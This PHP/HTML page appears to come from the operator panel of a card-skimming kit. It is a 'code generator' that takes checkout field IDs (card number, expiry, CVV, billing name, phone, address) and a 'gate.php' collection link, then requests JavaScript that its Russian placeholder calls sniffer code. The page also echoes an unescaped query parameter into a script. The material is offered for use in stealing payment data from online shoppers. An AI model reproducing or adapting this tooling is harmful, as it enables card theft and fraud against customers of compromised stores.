<?php
include_once __DIR__."/../../check_chmod.php";
if(!check_chmod_custom('generator')) exit('Идите пожалуйста нахуй отсюдава');
?>

<div class="container">
    <div class="box-standart mgt-30">
    <div class="box-head" role="tab" id="headingOne"><h4>Code generator</h4></div>
     
        
        
    <div class="box-content">
        <div class="alert alert-info"><b>Укажи id полей пример:</b><br> <?php echo htmlspecialchars('<input id="authorizenet_cc_number" name="payment[cc_number]">') ?> и тебе нужен ID этого поля то есть <b>authorizenet_cc_number</b></div>
        <div class="row">
            <div class="col-md-12"><input                                class="form-control mgt-10" placeholder="Link to gate.php" id="link"></div>
            <div class="col-md-4"> <input value="authorizenet_cc_number" class="form-control mgt-10" placeholder="card_num" id="card_num"></div>
            <div class="col-md-4"> <input value="authorizenet_expiration" class="form-control mgt-10" placeholder="card_expm" id="card_expm"></div>
            <div class="col-md-4"> <input value="authorizenet_expiration_yr" class="form-control mgt-10" placeholder="card_expy" id="card_expy"></div>
            <div class="col-md-4"> <input value="authorizenet_cc_cid" class="form-control mgt-10" placeholder="card_cvv" id="card_cvv"></div>
            <div class="col-md-4"> <input value="billing:firstname" class="form-control mgt-10" placeholder="fname" id="fname"></div>
            <div class="col-md-4"> <input value="billing:lastname" class="form-control mgt-10" placeholder="lname" id="lname"></div>
            <div class="col-md-4"> <input value="billing:telephone" class="form-control mgt-10" placeholder="tel" id="tel"></div>
            <div class="col-md-4"> <input value="billing:country_id" class="form-control mgt-10" placeholder="country" id="country"></div>
            <div class="col-md-4"> <input value="billing:region_id" class="form-control mgt-10" placeholder="region" id="region"></div>
            <div class="col-md-4"> <input value="billing:street1" class="form-control mgt-10" placeholder="street" id="street"></div>
            <div class="col-md-4"> <input value="billing:city" class="form-control mgt-10" placeholder="city" id="city"></div>
            <div class="col-md-4"> <input value="billing:postcode" class="form-control mgt-10" placeholder="zip" id="zip"></div>
        </div>
    <div class="form-group col-md-12 mgt-20">
        <label for="js_code">Code</label>
        <textarea placeholder='Тут будет код сниффера' readonly id="js_code" class="form-control"></textarea>
    </div>
    
   
    <div class="input-group col-md-6 mgt-20">
        <button onclick="get_js()" class="btn btn-primary">Generate</button>
    </div>
    
    
    </div>
</div>
</div>


<script>
    function get_js(){ 
        $('#modal-loading').modal({show:true,  backdrop: 'static', keyboard: false }); 
        $.post( "<?=$_GET['type']?>/ajax.php", { 
            type: 'gen_js',
            link: $('#link').val(),
            card_num: $('#card_num').val(),
            card_expm: $('#card_expm').val(),
            card_expy: $('#card_expy').val(),
            card_cvv: $('#card_cvv').val(),
            fname: $('#fname').val(),
            lname: $('#lname').val(),
            tel: $('#tel').val(),
            country: $('#country').val(),
            region: $('#region').val(),
            street: $('#street').val(),
            city: $('#city').val(),
            zip: $('#zip').val()
        })
         .done(function( data ) {
            $('#modal-loading').modal('hide');
            if(data.length > 40) {$('#js_code').val(data);show_success('Получите - распишитесь!');}
            else show_error('Ошибка генерации JS кода');
         });
    }
    
    
</script>